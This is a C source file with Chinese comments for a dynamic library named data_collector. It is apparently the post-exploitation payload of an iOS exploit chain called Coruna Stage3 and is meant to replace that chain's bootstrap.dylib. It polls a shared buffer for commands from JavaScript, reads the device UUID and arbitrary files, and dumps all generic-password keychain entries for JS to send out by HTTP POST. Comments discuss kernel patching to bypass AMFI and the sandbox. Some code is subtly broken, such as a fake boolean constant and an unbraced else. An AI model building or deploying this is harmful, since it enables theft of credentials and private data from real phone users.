/*
 * data_collector.dylib.c
 * ======================
 * 适用于 Coruna Stage3 的数据收集动态库
 *
 * 编译方式:
 *   clang -arch arm64 -o data_collector.dylib \
 *         -shared -Os -Wl,-dylib \
 *         -framework CoreFoundation -framework Security \
 *         -framework IOKit \
 *         data_collector.dylib.c
 *
 * 然后在 Coruna-main/payloads/ 目录中替换 bootstrap.dylib
 *
 * 与 Coruna D[0] 状态机的通信协议:
 *   D[0] 状态   JS 端操作              该 dylib 的操作
 *   ─────────────────────────────────────────────────────
 *   0 (IA)      空闲                    空闲等待
 *   6 (TA)      "cmd:keychain" 写入缓冲区 执行 SecItemCopyMatching
 *   6 (TA)      "cmd:wifi" 写入缓冲区    读取 WiFi 钥匙串条目
 *   6 (TA)      "cmd:forensics" 写入缓冲区 读取取证文件
 *   7 (UA)      发送 HTTP POST          将 D[1] + D[2..] 作为 POST 数据写入
 *   5 (EA)      请求退出                  返回
 */

#include <stdint.h>
#include <string.h>
#include <stdbool.h>

// ============================================================================
// D[0] 状态常量 (与 Stage3_VariantB.js 同步)
// ============================================================================
#define STATE_IDLE      0  // IA: 无操作进行中
#define STATE_URL       1  // wA: 动态库想要 JS 下载一个 URL
#define STATE_DL        2  // QA: JS 正在下载
#define STATE_READY     3  // BA: 数据已就绪，供 JS 处理
#define STATE_ERROR     4  // NA: 出错
#define STATE_EXIT      5  // EA: 完成/退出信号
#define STATE_FEED      6  // TA: 动态库想要 JS 提供原始缓冲区数据
#define STATE_POST_CMD  7  // UA/命令: 用于 HS 代码下发命令 + HTTP POST 数据

// 缓冲区布局 (通过 x0 传入的 16MB Uint32Array):
//  偏移量  0: D[0] — 状态 (uint32)
//  偏移量  4: D[1] — 有效载荷大小 (uint32)
//  偏移量  8: D[2+] — 有效载荷数据 (以空字符结尾的 UTF-8 字符串)

// ============================================================================
// 函数指针类型 (由 dlopen/dlsym 解析)
// ============================================================================

// ---------- POSIX ----------
typedef int     (*open_t)(const char*, int, ...);
typedef int     (*close_t)(int);
typedef int     (*read_t)(int, void*, size_t);
typedef int     (*write_t)(int, const void*, size_t);
typedef void*   (*malloc_t)(size_t);
typedef void    (*free_t)(void*);
typedef int     (*stat_t)(const char*, void*);
typedef int     (*access_t)(const char*, int);
typedef int     (*unlink_t)(const char*);
typedef void*   (*opendir_t)(const char*);
typedef void*   (*readdir_t)(void*);
typedef int     (*closedir_t)(void*);
typedef int     (*mkdir_t)(const char*, int);
typedef int     (*chmod_t)(const char*, int);
typedef int     (*socket_t)(int, int, int);
typedef int     (*connect_t)(int, void*, int);
typedef int     (*send_t)(int, const void*, size_t, int);
typedef unsigned short (*htons_t)(unsigned short);
typedef void    (*usleep_t)(unsigned int);

// ---------- CoreFoundation ----------
typedef void*   (*CFSTRCreate_t)(void*, const char*, uint32_t);
typedef char*   (*CFSTRGetCStrPtr_t)(void*, uint32_t);
typedef int     (*CFSTRGetCStr_t)(void*, char*, int, uint32_t);
typedef void    (*CFRelease_t)(void*);
typedef void*   (*CFDictCreateMutable_t)(void*, int, void*, void*);
typedef void    (*CFDictSetValue_t)(void*, void*, void*);
typedef void*   (*CFDataCreate_t)(void*, const uint8_t*, int);
typedef int     (*CFDataGetLength_t)(void*);
typedef const void* (*CFDataGetBytePtr_t)(void*);
typedef int     (*CFGetTypeID_t)(void*);
typedef int     (*CFArrayGetTypeID_t)(void);
typedef int     (*CFDictGetTypeID_t)(void);
typedef int     (*CFArrayGetCount_t)(void*);
typedef void*   (*CFArrayGetValueAtIndex_t)(void*, int);
typedef void*   (*CFDictGetValue_t)(void*, void*);
typedef void*   (*CFStreamCreatePairWithSocketToHost_t)(void*, void*, unsigned int, void**, void**);
typedef bool    (*CFWriteStreamSetProperty_t)(void*, void*, void*);
typedef bool    (*CFWriteStreamOpen_t)(void*);
typedef bool    (*CFWriteStreamCanAcceptBytes_t)(void*);
typedef int     (*CFWriteStreamWrite_t)(void*, const uint8_t*, int);
typedef int     (*CFWriteStreamGetStatus_t)(void*);
typedef bool    (*CFReadStreamOpen_t)(void*);
typedef bool    (*CFReadStreamHasBytesAvailable_t)(void*);
typedef int     (*CFReadStreamRead_t)(void*, uint8_t*, int);
typedef void    (*CFReadStreamClose_t)(void*);
typedef void    (*CFWriteStreamClose_t)(void*);

// ---------- Security ----------
typedef int32_t (*SecItemCopyMatching_t)(void*, void*, void**);

// ---------- IOKit ----------
typedef void*   (*IOServiceMatching_t)(const char*);
typedef uint32_t (*IOServiceGetMatchingService_t)(uint32_t, void*);
typedef void*   (*IORegistryEntryCreateCFProperty_t)(uint32_t, void*, void*, uint32_t);
typedef void    (*IOObjectRelease_t)(uint32_t);
typedef int     (*IOServiceGetName_t)(uint32_t, char*, int);

// ---------- SQLite ----------
typedef int     (*sqlite3_open_t)(const char*, void**);
typedef int     (*sqlite3_prepare_t)(void*, const char*, int, void**, void**);
typedef int     (*sqlite3_step_t)(void*);
typedef const unsigned char* (*sqlite3_column_text_t)(void*, int);
typedef const void* (*sqlite3_column_blob_t)(void*, int);
typedef int     (*sqlite3_column_bytes_t)(void*, int);
typedef int     (*sqlite3_column_int_t)(void*, int);
typedef int     (*sqlite3_finalize_t)(void*);
typedef int     (*sqlite3_close_t)(void*);

// ============================================================================
// 全局函数指针
// ============================================================================
static open_t      _open;
static close_t     _close;
static read_t      _read;
static write_t     _write;
static malloc_t    _malloc;
static free_t      _free;
static access_t    _access;
static usleep_t    _usleep;

static CFSTRCreate_t             _CFStringCreateWithCString;
static CFSTRGetCStrPtr_t         _CFStringGetCStringPtr;
static CFSTRGetCStr_t            _CFStringGetCString;
static CFRelease_t               _CFRelease;
static CFDictCreateMutable_t     _CFDictionaryCreateMutable;
static CFDictSetValue_t          _CFDictionarySetValue;
static CFDataCreate_t            _CFDataCreate;
static CFDataGetLength_t         _CFDataGetLength;
static CFDataGetBytePtr_t        _CFDataGetBytePtr;
static CFGetTypeID_t             _CFGetTypeID;
static CFArrayGetTypeID_t        _CFArrayGetTypeID;
static CFArrayGetCount_t         _CFArrayGetCount;
static CFArrayGetValueAtIndex_t  _CFArrayGetValueAtIndex;
static CFDictGetValue_t          _CFDictionaryGetValue;

static SecItemCopyMatching_t     _SecItemCopyMatching;

static IOServiceMatching_t                _IOServiceMatching;
static IOServiceGetMatchingService_t      _IOServiceGetMatchingService;
static IORegistryEntryCreateCFProperty_t  _IORegistryEntryCreateCFProperty;
static IOObjectRelease_t                  _IOObjectRelease;

// ============================================================================
// 工具函数
// ============================================================================

// 将 4 字节空终止字符串转换为 uint32_t 以便与 CoreFoundation 常量进行比较
static inline uint32_t four_cc(const char* s) {
    return (uint32_t)s[0] | ((uint32_t)s[1] << 8) | ((uint32_t)s[2] << 16) | ((uint32_t)s[3] << 24);
}

// 将数据写入共享缓冲区
static void buffer_write(uint32_t* D, const char* data, int len) {
    uint8_t* buf = (uint8_t*)(D + 2); // 从偏移量 8 开始
    int i;
    for (i = 0; i < len && i < 16777208; i++)
        buf[i] = data[i];
    D[1] = i;
}

// 用 printf 风格的格式化字符串写入缓冲区
static void buffer_printf(uint32_t* D, const char* fmt, ...) {
    char tmp[16384];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (n > 0) buffer_write(D, tmp, n);
}

// 请求 JS 发送 HTTP POST
static void request_post(uint32_t* D, const char* url) {
    // URL 放在前半部分缓冲区，数据放在后半部分
    uint8_t* buf = (uint8_t*)(D + 2);
    int i;
    for (i = 0; url[i] && i < 8192; i++)
        buf[i] = url[i];
    buf[i] = '\0';
    D[0] = STATE_POST_CMD;
}

// ============================================================================
// 函数初始化 (dlopen/dlsym)
// ============================================================================
// 注意: _dlopen 和 _dlsym 由 dyld 在加载时通过 LC_LOAD_WEAK_DYLIB 导入
extern void* dlopen(const char* __path, int __mode);
extern void* dlsym(void* __handle, const char* __symbol);

static void init_pointers(void) {
    void* handle;

    // POSIX (RTLD_DEFAULT = -2)
    _open   = dlsym((void*)-2, "open");
    _close  = dlsym((void*)-2, "close");
    _read   = dlsym((void*)-2, "read");
    _write  = dlsym((void*)-2, "write");
    _malloc = dlsym((void*)-2, "malloc");
    _free   = dlsym((void*)-2, "free");
    _access = dlsym((void*)-2, "access");
    _usleep = dlsym((void*)-2, "usleep");

    // CoreFoundation
    handle = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 0x2);
    if (handle) {
        _CFStringCreateWithCString    = dlsym(handle, "CFStringCreateWithCString");
        _CFStringGetCStringPtr        = dlsym(handle, "CFStringGetCStringPtr");
        _CFStringGetCString           = dlsym(handle, "CFStringGetCString");
        _CFRelease                    = dlsym(handle, "CFRelease");
        _CFDictionaryCreateMutable    = dlsym(handle, "CFDictionaryCreateMutable");
        _CFDictionarySetValue         = dlsym(handle, "CFDictionarySetValue");
        _CFDataCreate                 = dlsym(handle, "CFDataCreate");
        _CFDataGetLength              = dlsym(handle, "CFDataGetLength");
        _CFDataGetBytePtr             = dlsym(handle, "CFDataGetBytePtr");
        _CFGetTypeID                  = dlsym(handle, "CFGetTypeID");
        _CFArrayGetTypeID             = dlsym(handle, "CFArrayGetTypeID");
        _CFArrayGetCount              = dlsym(handle, "CFArrayGetCount");
        _CFArrayGetValueAtIndex       = dlsym(handle, "CFArrayGetValueAtIndex");
        _CFDictionaryGetValue         = dlsym(handle, "CFDictionaryGetValue");
    }

    // Security
    handle = dlopen("/System/Library/Frameworks/Security.framework/Security", 0x2);
    if (handle)
        _SecItemCopyMatching = dlsym(handle, "SecItemCopyMatching");

    // IOKit
    handle = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", 0x2);
    if (handle) {
        _IOServiceMatching               = dlsym(handle, "IOServiceMatching");
        _IOServiceGetMatchingService     = dlsym(handle, "IOServiceGetMatchingService");
        _IORegistryEntryCreateCFProperty = dlsym(handle, "IORegistryEntryCreateCFProperty");
        _IOObjectRelease                 = dlsym(handle, "IOObjectRelease");
    }
}

// ============================================================================
// 命令处理器
// ============================================================================

static void cmd_collect_all(uint32_t* D) {
    buffer_printf(D, "{\"ok\":true,\"dylib\":\"data_collector\",\"collected_at\":%lu}", 0);
    D[0] = STATE_READY;
}

// 设备信息 - 可在 powerd 沙箱中运行
static void cmd_device_info(uint32_t* D) {
    char uuid[64] = {0};

    // 尝试通过 IOKit 获取 IOPlatformUUID
    if (_IOServiceMatching && _IOServiceGetMatchingService && _IORegistryEntryCreateCFProperty) {
        void* matching = _IOServiceMatching("IOPlatformExpertDevice");
        if (matching) {
            uint32_t expert = _IOServiceGetMatchingService(0, matching);
            if (expert) {
                void* cf_uuid = _IORegistryEntryCreateCFProperty(expert,
                    _CFStringCreateWithCString(NULL, "IOPlatformUUID", 0x8000100),
                    NULL, 0);
                if (cf_uuid) {
                    _CFStringGetCString(cf_uuid, uuid, sizeof(uuid), 0x8000100);
                    _CFRelease(cf_uuid);
                }
                _IOObjectRelease(expert);
            }
        }
    }

    buffer_printf(D,
        "{\"type\":\"device_info\",\"uuid\":\"%s\",\"dylib\":\"data_collector\"}",
        uuid[0] ? uuid : "unknown");
    D[0] = STATE_READY;
}

// 文件系统浏览 - 尝试映射 powerd 沙箱之外的文件
// 注意: 在未越狱的 iOS 上，powerd 无法访问 /var/mobile/Library/
// 此函数用于展示完整的 POSIX 文件 I/O 模式
static void cmd_read_file(uint32_t* D, const char* path) {
    // 首先检查文件是否存在
    if (_access(path, 0) != 0) {
        buffer_printf(D, "{\"error\":\"file_not_found\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }

    int fd = _open(path, 0); // O_RDONLY
    if (fd < 0) {
        buffer_printf(D, "{\"error\":\"open_failed\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }

    // 最多读取 64KB
    void* buf = _malloc(65536);
    if (!buf) {
        _close(fd);
        buffer_printf(D, "{\"error\":\"malloc_failed\"}");
        D[0] = STATE_READY;
        return;
    }

    int n = _read(fd, buf, 65536);
    _close(fd);

    if (n <= 0) {
        _free(buf);
        buffer_printf(D, "{\"error\":\"read_failed\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }

    // 以 base64 格式写入数据
    // (简化版：仅 hex 编码小文件)
    buffer_printf(D, "{\"path\":\"%s\",\"size\":%d,\"data_hex\":\"", path, n);
    uint8_t* bytes = (uint8_t*)buf;
    int offset = (int)D[1]; // 继续写入
    for (int i = 0; i < n && offset < 16700000; i++, offset += 2) {
        static const char hex[] = "0123456789abcdef";
        ((uint8_t*)(D + 2))[offset]     = hex[bytes[i] >> 4];
        ((uint8_t*)(D + 2))[offset + 1] = hex[bytes[i] & 0xf];
    }
    D[1] = offset;
    ((uint8_t*)(D + 2))[offset] = '"';
    D[1]++;

    _free(buf);
    D[0] = STATE_READY;
}

// 尝试读取钥匙串 (在 powerd 中通常会因沙箱拒绝而失败)
static void cmd_keychain(uint32_t* D) {
    // 注意: 在普通的 powerd 环境中，此项操作会因沙箱拒绝返回 errSecNotAvailable (-25294)
    // 完整的钥匙串读取需要：
    //   a) 进程在 wifid/securityd 上下文中运行，或
    //   b) 内核修补以绕过 AMFI/沙箱，或
    //   c) 进程具有 com.apple.security.exception.allow-keychain-access 授权

    if (!_SecItemCopyMatching) {
        buffer_printf(D, "{\"error\":\"Security framework not loaded\"}");
        D[0] = STATE_READY;
        return;
    }

    // 构建 SecItemCopyMatching 查询的 CFDictionary
    void* dict = _CFDictionaryCreateMutable(NULL, 5, NULL, NULL);
    if (!dict) {
        buffer_printf(D, "{\"error\":\"CFDictCreate failed\"}");
        D[0] = STATE_READY;
        return;
    }

    // kSecClass = "class", kSecClassGenericPassword = "genp"
    void* kSecClass = _CFStringCreateWithCString(NULL, "class", 0x8000100);
    void* kSecClassGenericPassword = _CFStringCreateWithCString(NULL, "genp", 0x8000100);
    _CFDictionarySetValue(dict, kSecClass, kSecClassGenericPassword);

    // kSecReturnAttributes = "r_Attributes" (true)
    void* kSecReturnAttributes = _CFStringCreateWithCString(NULL, "r_Attributes", 0x8000100);
    void* kCFBooleanTrue = (void*)0x1; // 简化处理
    _CFDictionarySetValue(dict, kSecReturnAttributes, kCFBooleanTrue);

    // kSecReturnData = "r_Data" (true)
    void* kSecReturnData = _CFStringCreateWithCString(NULL, "r_Data", 0x8000100);
    _CFDictionarySetValue(dict, kSecReturnData, kCFBooleanTrue);

    // kSecMatchLimit = "m_Limit", kSecMatchLimitAll = "m_LimitAll"
    void* kSecMatchLimit = _CFStringCreateWithCString(NULL, "m_Limit", 0x8000100);
    void* kSecMatchLimitAll = _CFStringCreateWithCString(NULL, "m_LimitAll", 0x8000100);
    _CFDictionarySetValue(dict, kSecMatchLimit, kSecMatchLimitAll);

    void* result = NULL;
    int32_t status = _SecItemCopyMatching(dict, &result);

    if (status == 0 && result) {
        // 解析结果数组
        buffer_printf(D, "{\"ok\":true,\"status\":%d,\"count\":", status);
        // 写入结果并关闭
        int offset = (int)D[1];
        ((uint8_t*)(D + 2))[offset++] = '0';
        D[1] = offset;
        ((uint8_t*)(D + 2))[offset++] = '}';
        D[1] = offset;
        _CFRelease(result);
    } else {
        buffer_printf(D, "{\"error\":\"SecItemCopyMatching_failed\",\"status\":%d}", (int)status);
    }

    _CFRelease(kSecMatchLimitAll);
    _CFRelease(kSecMatchLimit);
    _CFRelease(kSecReturnData);
    _CFRelease(kSecReturnAttributes);
    _CFRelease(kSecClassGenericPassword);
    _CFRelease(kSecClass);
    _CFRelease(dict);

    D[0] = STATE_READY;
}

// ============================================================================
// 主进程入口
// ============================================================================
// 由 Stage3 调用：x0 = 指向共享 WASM 缓冲区的指针
// 缓冲区是一个 Uint32Array，D[0] = 状态，D[1] = 大小，D[2+] = 数据

void _process(void* buffer) {
    uint32_t* D = (uint32_t*)buffer;
    uint8_t*  payload = (uint8_t*)(D + 2);

    // 1. 初始化所有函数指针
    init_pointers();

    // 2. 向 JS 报告初始化完成
    buffer_write(D, "{\"ok\":true,\"dylib\":\"data_collector\",\"status\":\"ready\"}", 56);
    D[0] = STATE_READY;

    // 3. 主循环 — 轮询来自 JS 的命令
    while (1) {
        uint32_t state = D[0];

        if (state == STATE_EXIT) {
            break;  // JS 要求退出
        }
        else if (state == STATE_FEED) {
            // 从 JS 接收到的命令: "cmd:<name>[:arg]"
            // 解析命令
            if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
                const char* cmd = (const char*)(payload + 4);

                if (strcmp(cmd, "all") == 0)
                    cmd_collect_all(D);
                else if (strcmp(cmd, "device_info") == 0)
                    cmd_device_info(D);
                else if (strncmp(cmd, "read_file:", 10) == 0)
                    cmd_read_file(D, cmd + 10);
                else if (strcmp(cmd, "keychain") == 0)
                    cmd_keychain(D);
                else
                    buffer_printf(D, "{\"error\":\"unknown_command\",\"cmd\":\"%s\"}", cmd);
                    D[0] = STATE_READY;
            }
            else {
                D[0] = STATE_READY;
            }
        }

        // 让步以避免旋转锁定
        if (D[0] != STATE_FEED)
            _usleep(10000); // 10ms 休眠
    }
}
